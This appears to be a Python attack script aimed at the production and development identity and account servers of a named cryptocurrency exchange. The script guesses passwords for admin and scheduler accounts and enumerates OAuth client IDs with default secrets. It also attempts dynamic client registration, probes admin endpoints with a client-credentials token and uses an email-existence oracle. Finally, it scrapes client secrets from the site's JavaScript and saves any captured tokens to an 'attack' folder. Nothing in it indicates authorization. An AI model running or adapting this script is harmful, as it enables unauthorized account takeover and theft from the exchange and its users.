import hashlib, requests, json, sys, urllib3, re
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

T = 20
H_FORM = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
H_JSON = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

HKDEV_ID = "https://identityhkdev.mx.exchange"
PROD_ID = "https://identity.mx.exchange"
HKDEV_ACCT = "https://accounthkdev.mx.exchange"
PROD_ACCT = "https://account.mx.exchange"

def sha256(s):
    return hashlib.sha256(s.encode("utf-8")).hexdigest()

def token(base, data, label):
    try:
        r = requests.post(f"{base}/connect/token", data=data, headers=H_FORM, timeout=T, verify=False)
    except Exception as e:
        print(f"  [X] {label} => {e}")
        return None
    txt = r.text[:350].encode("ascii", "replace").decode("ascii")
    if r.status_code == 200:
        print(f"  [!!! TOKEN !!!] {label}")
        print(f"    {txt}")
        return r.json()
    err = ""
    try:
        err = r.json().get("error", "") + " " + r.json().get("error_description", "")
    except Exception:
        err = txt
    # print only interesting
    if "invalid_client" in err or "unauthorized_client" in err:
        print(f"  [-] {label} => {err.strip()[:80]}")
    elif "Not allowed" in err:
        print(f"  [block] {label} => Not allowed")
    elif "invalid_grant" in err:
        print(f"  [grant-ok/bad-pass] {label} => {err.strip()[:100]}")
    else:
        print(f"  [?] {label} => {r.status_code} {txt[:200]}")
    return None

print("=" * 70)
print("MX — OTHER CLIENTS + SHA256 ADMIN LOGIN")
print("=" * 70)

# ---- 1. SHA256 login with known registered users ----
print("\n[1] Password grant with SHA256(password) — admin login format")
users = [
    ("testuser@gmail.com", "TestPass123!@#"),
    ("admin@orca.exchange", "admin"),
    ("admin@orca.exchange", "Admin123!"),
    ("admin@orca.exchange", "P@ssw0rd"),
    ("admin@orca.exchange", "Orca2024!"),
    ("admin@orca.exchange", "Orca@2024"),
    ("admin@orca.exchange", "Password1"),
    ("itscheduler@orca.exchange", "scheduler"),
    ("itscheduler@orca.exchange", "Scheduler123!"),
    ("itscheduler@orca.exchange", "P@ssw0rd"),
    ("itschedulartrade@orca.exchange", "scheduler"),
    ("itscheduler2@orca.exchange", "scheduler"),
]

clients = [
    ("spa", "secret"),
    ("mx-mobile", "secret"),
    ("mx-mobile", ""),
    ("test", "secret"),
]

hits = {}
for env, base in [("HKDEV", HKDEV_ID), ("PROD", PROD_ID)]:
    print(f"\n  === {env} ===")
    for email, pw in users:
        hashed = sha256(pw)
        for cid, csec in clients:
            # admin form: username + sha256 password
            data = {
                "client_id": cid,
                "client_secret": csec,
                "grant_type": "password",
                "username": email,
                "password": hashed,
            }
            label = f"{env}|{cid}|{email}|sha256({pw[:8]})"
            res = token(base, data, label)
            if res:
                hits[label] = res
                with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\USER_TOKEN.json", "w") as f:
                    json.dump({"label": label, "token": res}, f, indent=2)

            # also plaintext once per client (already known, skip noise except first user)
            if email == "testuser@gmail.com" and cid == "spa":
                data2 = dict(data)
                data2["password"] = pw
                token(base, data2, f"{env}|{cid}|{email}|PLAIN")

# ---- 2. Broader client_id enum (orca + identityserver defaults) ----
print("\n[2] Extra client_id enum (orca brand + IS4 defaults)")
more_clients = [
    "orca", "orca-web", "orca-admin", "orca-spa", "orca.web", "orca.admin",
    "orca.spa", "orca-mobile", "orca.mobile", "Orca", "OrcaWeb", "OrcaAdmin",
    "admin-portal", "adminportal", "admin_portal", "backoffice",
    "ro.client", "roclient", "resourceowner", "password",
    "js", "mvc", "native", "xamarin", "swagger", "swaggerui",
    "postman", "insomnia", "openiddict", "identity",
    "mx-web", "mx-admin", "mx-spa", "mx.web", "mx.admin",
    "hkdev", "hk-dev", "hkdev-spa", "hkdev-admin",
    "trading", "web-trading", "webtrading",
    "broker", "broker-api", "openapi", "open-api",
    "cokeeps", "bitgo", "onfido",
    "itscheduler", "scheduler", "job", "hangfire",
    "signalr", "hub", "notification-hub",
    "spa-admin", "spa.admin", "spa_admin",
    "mobile", "ios-app", "android-app",
    "mxglobal", "mx-global", "MX",
]

for env, base in [("HKDEV", HKDEV_ID), ("PROD", PROD_ID)]:
    print(f"\n  --- {env} ---")
    for cid in more_clients:
        r = requests.post(f"{base}/connect/token", data={
            "client_id": cid, "client_secret": "secret",
            "grant_type": "client_credentials",
        }, headers=H_FORM, timeout=T, verify=False)
        body = r.text[:200]
        if r.status_code == 200:
            print(f"  [!!!] {cid}:secret => TOKEN")
            hits[f"{env}_{cid}"] = r.json()
        elif "invalid_client" not in body:
            print(f"  [EXISTS?] {cid}:secret => {r.status_code} {body[:160]}")
            # try password grant to confirm existence
            r2 = requests.post(f"{base}/connect/token", data={
                "client_id": cid, "client_secret": "secret",
                "grant_type": "password", "username": "x", "password": "y",
            }, headers=H_FORM, timeout=T, verify=False)
            print(f"         password-probe => {r2.text[:160]}")

# ---- 3. Dynamic client registration ----
print("\n[3] IdentityServer dynamic client registration")
for env, base in [("HKDEV", HKDEV_ID), ("PROD", PROD_ID)]:
    for path in ["/connect/register", "/connect/register/", "/.well-known/openid-configuration"]:
        try:
            if path.endswith("openid-configuration"):
                r = requests.get(f"{base}{path}", timeout=T, verify=False)
                if r.status_code == 200:
                    cfg = r.json()
                    print(f"  [{env}] registration_endpoint={cfg.get('registration_endpoint')}")
                    print(f"  [{env}] grants={cfg.get('grant_types_supported')}")
                    print(f"  [{env}] token_endpoint_auth={cfg.get('token_endpoint_auth_methods_supported')}")
            else:
                r = requests.post(f"{base}{path}", json={
                    "client_name": "test",
                    "redirect_uris": ["https://example.com/cb"],
                    "grant_types": ["authorization_code", "password"],
                    "response_types": ["code"],
                    "token_endpoint_auth_method": "client_secret_post",
                }, headers=H_JSON, timeout=T, verify=False)
                print(f"  [{env}] POST {path} => {r.status_code} {r.text[:250]}")
        except Exception as e:
            print(f"  [{env}] {path} => {e}")

# ---- 4. Identity admin with spa client_credentials JWT ----
print("\n[4] Identity admin endpoints with spa JWT")
r = requests.post(f"{PROD_ID}/connect/token", data={
    "client_id": "spa", "client_secret": "secret", "grant_type": "client_credentials",
}, headers=H_FORM, timeout=T, verify=False)
if r.status_code == 200:
    jwt = r.json()["access_token"]
    print(f"  Got PROD spa JWT ({len(jwt)} chars)")
    HB = {"Authorization": f"Bearer {jwt}", "Accept": "application/json"}
    for path in [
        "/api/Clients", "/api/clients", "/connect/userinfo",
        "/api/Account", "/Account", "/api/Users",
        "/.well-known/openid-configuration/jwks",
        "/api/Client", "/configuration/clients",
    ]:
        try:
            rr = requests.get(f"{PROD_ID}{path}", headers=HB, timeout=T, verify=False)
            if rr.status_code not in (404, 405):
                print(f"  GET {path} => {rr.status_code} {rr.text[:200]}")
        except Exception as e:
            print(f"  GET {path} => {e}")

# ---- 5. Checkaccountemail oracle ----
print("\n[5] Checkaccountemail oracle")
emails = [
    "admin@orca.exchange", "itscheduler@orca.exchange",
    "itschedulartrade@orca.exchange", "itscheduler2@orca.exchange",
    "testuser@gmail.com", "admin@mx.exchange", "hello@mx.exchange",
]
for env, acct in [("HKDEV", HKDEV_ACCT), ("PROD", PROD_ACCT)]:
    print(f"  --- {env} ---")
    for em in emails:
        for path in ["/api/Account/Checkaccountemail", "/api/Account/CheckAccountEmail"]:
            try:
                rr = requests.post(f"{acct}{path}", json={"email": em},
                                   headers=H_JSON, timeout=T, verify=False)
                if rr.status_code != 404:
                    print(f"  {path} {em} => {rr.status_code} {rr.text[:200]}")
            except Exception as e:
                print(f"  {path} {em} => {e}")

# ---- 6. Download web-hkdev main.js ----
print("\n[6] web-hkdev main.js mine")
try:
    page = requests.get("https://web-hkdev.mx.exchange/", headers={"User-Agent": "Mozilla/5.0"}, timeout=T, verify=False)
    scripts = re.findall(r'src="([^"]*main[^"]*\.js[^"]*)"', page.text)
    print(f"  scripts: {scripts}")
    for s in scripts:
        url = s if s.startswith("http") else f"https://web-hkdev.mx.exchange{s if s.startswith('/') else '/' + s}"
        js = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=30, verify=False)
        print(f"  {url} => {js.status_code} {len(js.text)} bytes")
        if js.status_code == 200 and len(js.text) > 1000:
            out = r"c:\xampp\htdocs\pentagi\mxexchange_attack\web_hkdev_main.js"
            with open(out, "w", encoding="utf-8", errors="replace") as f:
                f.write(js.text)
            for pat, lab in [
                (r"client_id[\"'\s:=]+([a-zA-Z0-9._\-]+)", "client_id"),
                (r"client_secret[\"'\s:=]+([a-zA-Z0-9._\-!@#$%]+)", "client_secret"),
                (r"ClientId\s*=\s*'([^']+)'", "ClientId"),
                (r"ClientSecret\s*=\s*'([^']+)'", "ClientSecret"),
            ]:
                ms = list(set(re.findall(pat, js.text)))[:15]
                if ms:
                    print(f"    {lab} = {ms}")
except Exception as e:
    print(f"  web js error: {e}")

print(f"\n{'='*70}")
print(f"TOKEN HITS: {len(hits)}")
for k in hits:
    print(f"  {k}")
print("=" * 70)
